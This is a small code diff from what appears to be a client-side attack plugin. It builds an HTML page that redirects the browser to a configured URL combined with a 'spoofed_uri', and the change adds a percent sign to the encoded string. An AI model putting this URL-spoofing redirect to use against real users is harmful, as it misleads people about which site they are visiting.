@@ -57,7 +57,7 @@ class Plugin(plugins.ClientPlugin):
 	def build_html(self, _):
 		page = '<html>'\
 		'<script>'\
-		'window.location.href = decodeURIComponent("'+ self.escape_url(self.config['redir_url'], self.config['spoofed_uri']) + \
+		'window.location.href = decodeURIComponent("%'+ self.escape_url(self.config['redir_url'], self.config['spoofed_uri']) + \
 		'")'\
 		'</script>'\
 		'</html>'\
